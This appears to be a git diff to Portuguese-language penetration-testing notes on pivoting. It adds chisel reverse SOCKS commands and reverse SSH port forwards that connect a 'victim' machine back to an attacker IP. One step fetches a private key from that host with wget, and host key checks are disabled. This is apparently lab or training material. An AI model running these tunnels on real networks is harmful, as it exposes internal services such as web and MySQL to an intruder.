@@ -9,9 +9,21 @@ No  Windows utilizamos o chisel, porém em ambientes mais maduros o Antivírus p
 
     chisel.exe client <ip_atacante>:<porta> R:<porta>:socks
 
+Exemplo:
+
+    ./chisel.exe client 10.10.14.8:9999 R:5000:127.0.0.1:8888
+
+ou
+
+    ./chisel.exe client 10.10.14.8:9999 R:5000:socks
+
 Na máquina do atacante (Kali Linux)
 
     chisel server -p <porta> --socks5 --reverse
+
+Exemplo
+
+        chisel server -p 9999 --socks5 --reverse
 
 Depois é necessário configurar o proxychains:
 
@@ -20,8 +32,24 @@ Depois é necessário configurar o proxychains:
 
 **Cenário Linux**
 
+Dinâmico. Na máquina do atacante devemos gerar uma chave privada e pública para evitar de mandar a senha para o servidor remoto:
 
+    ssh-keygen
+    mkdir /home/acosta/.ssh
+    cat id_rsa.pub >> /home/acosta/.ssh/authorized_keys
 
+Na máquina da vítima temos de prepara o permissionamento da chave privada para acessar a máquina atacante:
+
+    wget http://10.10.10.10/id_rsa -O id_rsa
+    chmod 600 id_rsa
+
+No cenário de acessar um web server na porta 8000 local por meio da máquina do atacante na porta 127.0.0.1:5555
+
+    ssh -nNT -i id_rsa -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -R 5555:127.0.0.1:8000 acosta@10.10.14.10 -p 2222&
+
+No cenário de fazer isso com o mysql, por exemplo:
+
+    ssh -nNT -i id_rsa -o "StrictHostKeyChecking=no" -o "UserKnownHostsFile=/dev/null" -R 5555:127.0.0.1:3306 acosta@10.10.14.10 -p 2222&
 
 ## Chisel
 
